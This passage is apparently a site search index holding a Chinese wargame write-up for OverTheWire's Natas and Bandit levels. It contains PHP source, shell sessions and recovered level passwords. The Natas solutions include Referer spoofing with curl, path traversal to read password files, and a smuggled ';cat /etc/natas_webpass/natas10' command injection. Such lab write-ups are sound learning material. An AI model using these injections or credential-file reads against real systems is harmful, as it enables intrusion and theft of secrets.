src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas2\", \"pass\": \"h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7\" };</script></head> <body> <h1>natas2</h1> <div id=\"content\"> There is nothing on this page <img src=\"files/pixel.png\"> </div> </body></html> \u6709\u4e2a\u56fe\u7247\uff0c\u70b9\u8fdb\u53bb\u770b\uff0c\u8fdb\u7236\u76ee\u5f55 http://natas2.natas.labs.overthewire.org/files/ \u5f97\u5230\u5bc6\u7801 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q eve:zo4mJWyNj2 mallory:9urtcpzBmH","title":"level2"},{"location":"WarGame/Natas/#level3","text":"\u6e90\u4ee3\u7801\u5565\u4e5f\u6ca1\u6709\uff0c\u5f88G <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas3\", \"pass\": \"G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q\" };</script></head> <body> <h1>natas3</h1> <div id=\"content\"> There is nothing on this page <!-- No more information leaks!! Not even Google will find it this time... --> </div> </body></html> \u8c37\u6b4c\u641c\u4e0d\u5230\uff1f\u6211\u5fc5\u5e94\u6765\u641c\uff01 \u8fdb\u53bb\u662f\u4e00\u4e2a\u548clevel2\u4e00\u6837\u7684\u754c\u9762\uff0c\u89e3\u51b3\u4e86\u3002\u3002\u3002 natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \u8fd9\u4e2a\u9898\u9700\u8981\u77e5\u9053 site: \u8fd9\u4e2a\u9ad8\u7ea7\u641c\u7d22\u7528\u6cd5","title":"level3"},{"location":"WarGame/Natas/#level4","text":"<html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\" <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> \u7136\u540e\u4e00\u6761\u547d\u4ee4\u89e3\u51b3 C:\\Users\\>curl -e \"http://natas5.natas.labs.overthewire.org/\" -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \"http://natas4.natas.labs.overthewire.org/\" <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> C:\\Users\\> \u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528burpsuite,\u81ea\u5df1\u53d1\u5305","title":"level4"},{"location":"WarGame/Natas/#level5","text":"\u53d1\u73b0\u9700\u8981cookie \u90a3\u4e48\u968f\u4fbf\u6539\u6539\u4e5f\u5c31\u89e3\u51b3\u4e86 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR","title":"level5"},{"location":"WarGame/Natas/#level6","text":"\u8fdb\u6765\u53ef\u4ee5\u770b\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"<censored>\" };</script></head> <body> <h1>natas6</h1> <div id=\"content\"> <? include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> <form method=post> Input secret: <input name=secret><br> <input type=submit name=submit> </form> <div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div> </div> </body> </html> \u8fd9\u91cc\u4e0e\u5bc6\u94a5\u6709\u4e00\u4e2a\u662f\u5426\u76f8\u540c\u7684\u5224\u65ad\uff0c\u90a3\u4e48\u76f4\u63a5\u8bbf\u95ee\u90a3\u4e2a\u7f51\u5740 includes/secret.inc \uff0c\u5f97\u5230\u5bc6\u94a5 <? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?> \u7136\u540e\u8f93\u5165\uff0c\u5f97\u5230\u5bc6\u7801 Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr","title":"level6"},{"location":"WarGame/Natas/#level7","text":"\u767b\u5f55\u540e\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr\" };</script></head> <body> <h1>natas7</h1> <div id=\"content\"> <a href=\"index.php?page=home\">Home</a> <a href=\"index.php?page=about\">About</a> <br> <br> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --> </div> </body> </html> \u8fd9\u4e2a\u63d0\u793a\uff0c\u5f88\u6709\u8fd9\u4e2a\u7f51\u7ad9\u7684\u98ce\u683c\u3002\u3002\u3002 # \u8bbf\u95ee\u7f51\u5740http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 # \u5bc6\u94a5 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB","title":"level7"},{"location":"WarGame/Natas/#level8","text":"\u6838\u5fc3\u5728\u4e0b\u8fb9\u513f <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> strrev\u51fd\u6570\u7684 \u8bf4\u660e \uff0c\u5c31\u662f\u53cd\u8f6c\u5b57\u7b26\u4e32\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u627e\u4e00\u4e9b\u5728\u7ebf\u5c0f\u5de5\u5177\u505a\u4e0b\u9762\u7684\u64cd\u4f5c <?php echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\"))); ?> \u8f93\u51fa\u7ed3\u679c\u540e\uff0c\u5f97\u5230\u5bc6\u94a5 Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd","title":"level8"},{"location":"WarGame/Natas/#level9","text":"<? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> \u76f4\u63a5\u547d\u4ee4\u6ce8\u5165 \u8f93\u5165;cat /etc/natas_webpass/natas10 \u5f97\u5230\u5bc6\u94a5 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE","title":"level9"},{"location":"WarGame/Natas/#level10","text":"\u4ed6\u4eec\u5b66\u806a\u660e\u4e86 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> \u5c31\u662f\u5199\u6b63\u5219\uff0c\u6c34\u7684 [a-zA-Z] /etc/natas_webpass/natas11 # [[:alpha:]] /etc/natas_webpass/natas11 # 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg","title":"level10"},{"location":"WarGame/Natas/#level11","text":"\u4ee3\u7801\u5ba1\u8ba1\u5de5\u4f5c\u5982\u4e0b\uff1a <? $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?>","title":"level11"},{"location":"WarGame/Natas/#level12","text":"","title":"level12"},{"location":"WarGame/Natas/#level13","text":"","title":"level13"},{"location":"WarGame/Natas/#level14","text":"","title":"level14"},{"location":"WarGame/Natas/#level15","text":"","title":"level15"},{"location":"WarGame/Natas/#level16","text":"","title":"level16"},{"location":"WarGame/Natas/#level17","text":"","title":"level17"},{"location":"WarGame/Natas/#level18","text":"","title":"level18"},{"location":"WarGame/Natas/#level19","text":"","title":"level19"},{"location":"WarGame/Natas/#level20","text":"","title":"level20"},{"location":"WarGame/Natas/#level21","text":"","title":"level21"},{"location":"WarGame/Natas/#level21_1","text":"","title":"level21"},{"location":"WarGame/Natas/#level23","text":"","title":"level23"},{"location":"WarGame/Natas/#level24","text":"","title":"level24"},{"location":"WarGame/Natas/#level25","text":"","title":"level25"},{"location":"WarGame/Natas/#level26","text":"","title":"level26"},{"location":"WarGame/Natas/#level27","text":"","title":"level27"},{"location":"WarGame/Natas/#level28","text":"","title":"level28"},{"location":"WarGame/Natas/#level29","text":"","title":"level29"},{"location":"WarGame/Natas/#level30","text":"","title":"level30"},{"location":"WarGame/Natas/#level31","text":"","title":"level31"},{"location":"WarGame/Natas/#level32","text":"","title":"level32"},{"location":"WarGame/Natas/#level33","text":"","title":"level33"},{"location":"WarGame/bandit/","text":"OverTheWire\u793e\u533a\u662f\u4e00\u4e2a\u63d0\u4f9bwargame\u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u7231\u597d\u8005\u4ee5\u8da3\u5473\u7684\u65b9\u5f0f\u8fdb\u884c\u5b66\u4e60\u3001\u7ec3\u4e60\u5b89\u5168\u77e5\u8bc6\u3002 bandit\uff0c\u719f\u6089linux\u548cbash\u7684\u6709\u8da3\u7684\u7f51\u7ad9 level0 ssh\u8fdc\u7a0b\u767b\u5f55 ssh bandit0@bandit.labs.overthewire.org -p 2220 # \u7136\u540e\u8f93\u5165\u5bc6\u7801\u5373\u53ef \u987a\u5229\u62ff\u5230\u63d0\u793a\u7b26 level1 \u8981\u6c42\u4f7f\u7528cat\u547d\u4ee4\uff0c\u6c34 bandit0@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit1 bandit0 33 Apr 23 18:04 readme bandit0@bandit:~$ cat readme NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL bandit0@bandit:~$ level2 \u5904\u7406\u540d\u5b57\u53eb\u201c-\u201d\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u7531\u4e8e\u4f1a\u548c\u53c2\u6570\u89e3\u6790\u6df7\u4e86\uff0c\u6211\u7684\u5904\u7406\u529e\u6cd5\u662f\u52a0\u4e0a\u201c./\u201d bandit1@bandit:~$ ll total 24 -rw-r----- 1 bandit2 bandit1 33 Apr 23 18:04 - drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit1@bandit:~$ cat ./- rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi bandit1@bandit:~$ level3 \u5904\u7406\u540d\u5b57\u91cc\u6709\u7a7a\u683c\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u62ff\u53cc\u5f15\u53f7\u5305\u8d77\u6765\u5373\u53ef bandit2@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit3 bandit2 33 Apr 23 18:04 spaces in this filename bandit2@bandit:~$ cat \"spaces in this filename\" aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG bandit2@bandit:~$ level4 \u5904\u7406\u6587\u4ef6\u5939\uff0c\u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662fcd\u8fdb\u53bb\u518d\u5904\u7406\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u9636\u6bb5\u8fd8\u4e0d\u6d89\u53ca\u7edd\u5bf9\u8def\u5f84\u3001\u76f8\u5bf9\u8def\u5f84\u4e4b\u7c7b\u7684\u6982\u5ff5\uff0c\u4f46\u662f\u6211\u61d2\u4e86 \u53e6\u5916\uff0c\u8fd8\u6709\u4e2a\u5904\u7406\u9690\u85cf\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528ls -l\u547d\u4ee4\uff0c\u5728\u5927\u591a\u6570bash\u4e2d\u4f1a\u628als -al\u5199\u6210\u522b\u540dll \u4e5f\u53ef\u4ee5\u4f7f\u7528ls -a bandit3@bandit:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc drwxr-xr-x 2 root root 4096 Apr 23 18:04 inhere/ -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit3@bandit:~$ ls inhere/ bandit3@bandit:~$ ll inhere/ total 12 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit4 bandit3 33 Apr 23 18:04 .hidden bandit3@bandit:~$ cat ./inhere/.hidden 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe bandit3@bandit:~$ level5 bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ll total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file00 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file01 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file02 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file03 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file04 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file05 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file06 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file07 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file08 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file09 bandit4@bandit:~/inhere$ cat ./-file06 '\ufffdwk^j\ufffd\ufffdM\ufffd;,\ufffdco9bandit4@bandit:~/inhere$ # \u4f7f\u7528reset\u540e bandit4@bandit:~/inhere$ cat ./-file07 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR bandit4@bandit:~/inhere$ \u8fd9\u91cc \u6709\u4e00\u4e2a\u8bb2\u4e86reset\u548cclear\u7684\u533a\u522b\uff0c\u5f88\u7b80\u5355 level6 \u633a\u9ebb\u70e6\u7684\u4e00\u4e2a\u9e21\u513f\u9898 bandit5@bandit:~/inhere$ cd maybehere07 bandit5@bandit:~/inhere/maybehere07$ ll total 56 drwxr-x--- 2 root bandit5 4096 Apr 23 18:04 ./ drwxr-x--- 22 root bandit5 4096 Apr 23 18:04 ../ -rwxr-x--- 1 root bandit5 3663 Apr 23 18:04 -file1* -rwxr-x--- 1 root bandit5 3065 Apr 23 18:04 .file1* -rw-r----- 1 root bandit5 2488 Apr 23 18:04 -file2 -rw-r----- 1 root bandit5 1033 Apr 23 18:04 .file2 -rwxr-x--- 1 root bandit5 3362 Apr 23 18:04 -file3* -rwxr-x--- 1 root bandit5 1997 Apr 23 18:04 .file3* -rwxr-x--- 1 root bandit5 4130 Apr 23 18:04 spaces file1* -rw-r----- 1 root bandit5 9064 Apr 23 18:04 spaces file2 -rwxr-x--- 1 root bandit5 1022 Apr 23 18:04 spaces file3* bandit5@bandit:~/inhere/maybehere07$ cat .file2 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU \u8fd9\u91cc\u9700\u8981\u77e5\u9053ll\u8f93\u51fa\u7684\u8fd9\u4e00\u5927\u5806\u90fd\u662f\u5565\u73a9\u610f\u513f\uff0crwx\u5206\u522b\u4ee3\u8868\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff0c\u5269\u4e0b\u7684\u770b\u6587\u6863\u5427\u3002 level7 \u8981\u4f7f\u7528find\u4e86 # \u6211cd\u5230\u6839\u76ee\u5f55\u4e5f\u6ca1\u600e\u4e48\u53d1\u73b0\uff0c\u56e0\u6b64\u76f4\u63a5find\u641c\u7d22\u4e86\uff0c\u8fd8\u633a\u5feb\u7684\uff0c\u6309\u7406\u8bf4linux\u81ea\u5e26\u8fd9\u4e9b\u7834\u73a9\u610f\u513f\u4e0d\u8be5\u8fd9\u4e48\u5feb\u7684\u3002\u3002\u3002 bandit6@bandit:/$ find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null /var/lib/dpkg/info/bandit7.password bandit6@bandit:/$ cat /var/lib/dpkg/info/bandit7.password z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S \u90a3\u4e2a\u659c\u6760\u662f\u6307\u5b9a\u4e3a\u6839\u76ee\u5f55\uff0c\u7136\u540e\u5c31\u662f\u5927\u5c0f\u3001\u7528\u6237\u3001\u7ec4\uff0c\u6700\u540e\u6709\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u9ed1\u6d1e\uff0c\u4e0d\u5199\u4e5f\u6ca1\u4e8b\u513f\uff0c\u6211\u4e60\u60ef\u4e86 level8 \u8fd9\u4e2a\u5c31\u662fgrep bandit7@bandit:~$ find / -type f -name \"data.txt\" -exec grep -l \"million\" {} \\; 2>/dev/null /home/bandit7/data.txt bandit7@bandit:~$ grep \"millionth\" data.txt millionth TESKZC0XvTetK0S9xNwm25STk5iWrBvP \u5176\u5b9e\u53e6\u4e00\u4e2a\u529e\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\u7136\u540e\u7528vim\u7684\u641c\u7d22\uff0c\u6211\u8bd5\u4e86\u8bd5\u4e5f\u633a\u5feb\u7684 level9 \u7528\u4e00\u4e0bsort\u5373\u53ef bandit8@bandit:~$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit9 bandit8 33033 Apr 23 18:04 data.txt -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head -n1 1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t bandit8@bandit:~$ level10 \u597d\u50cf\u662f\u6b63\u5219\uff0c\u6211\u4e0d\u592a\u4f1a\uff0c\u8349\u8349\u5199\u4e86\u4e9b bandit9@bandit:~$ strings data.txt | grep -oE \"==.*\" ========== the# ========== password ========== is ========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s bandit9@bandit:~$ level11 base64\u89e3\u7801 bandit10@bandit:~$ cat data.txt | base64 -d The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM bandit10@bandit:~$ level12 \u4f7f\u7528tr \u4e07\u5e78\u67e5\u4e86\u4e00\u4e0b\uff0c\u5dee\u70b9\u513f\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv level13 \u6709\u70b9\u513f\u590d\u6742\u554a\uff0c\u95ee\u7684chatgpt\u7136\u540e\u624d\u4f1a\u7684 # \u5148mkdir\u7136\u540ecp bandit12@bandit:~$ cd /tmp/myname123 bandit12@bandit:/tmp/myname123$ xxd -r /tmp/myname123/data.txt > /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ file /tmp/myname123/data.bin /tmp/myname123/data.bin: gzip compressed data, was \"data2.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581 bandit12@bandit:/tmp/myname123$ gzip -d -S .bin /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ ll total 10628 drwxrwxr-x 2 bandit12 bandit12 4096 Jul 17 03:01 ./ drwxrwx-wt 3791 root root 10801152 Jul 17 03:03 ../ -rw-rw-r-- 1 bandit12 bandit12 0 Jul 17 02:39 bandit -rw-rw-r-- 1 bandit12 bandit12 581 Jul 17 02:59 data -rw-rw-r-- 1 bandit12 bandit12 20480 Jul 16 19:05 data5.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data6.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data8.tar -rw-r--r-- 1 bandit12 bandit12 49 Apr 23 18:04 data9 -rw-rw-r-- 1 bandit12 bandit12 581 Jul 16 15:25 data.bz2 -rw-r----- 1 bandit12 bandit12 2642 Jul 16 19:00 data.hex -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:50 data.txt -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:34 mydata.txt bandit12@bandit:/tmp/myname123$ cat data9 The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw bandit12@bandit:/tmp/myname123$ level14 \u6c34\uff0c\u7528\u79c1\u94a5\u767b\u5f55 bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit13/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit14@bandit:~$ level15 nc\u8fd9\u4e2a\u547d\u4ee4\u5728\u590d\u6742\u60c5\u51b5\u4e0b\u9700\u8981\u81ea\u5df1\u5199http\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u633a\u79bb\u8c31\u7684\uff0c\u8fd8\u662fcurl\u548cpython\u65b9\u4fbf \u4e00\u4e9b\u5b66\u4e60\u7684\u94fe\u63a5 https://juejin.cn/post/6995203632387866631 \u3001 https://www.runoob.com/linux/linux-comm-nc.html \uff0c\u66f4\u591a\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003CSE365 sp23\u7684 talking web \u6a21\u5757\u3002 bandit14@bandit:/etc/bandit_pass$ cat bandit14 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq bandit14@bandit:/etc/bandit_pass$ cat bandit14 | nc localhost 30000 Correct! jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt bandit14@bandit:/etc/bandit_pass$ level16 bandit14@bandit:echo \"jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt\" | openssl s_client -connect localhost:30001 -ign_eof Correct! 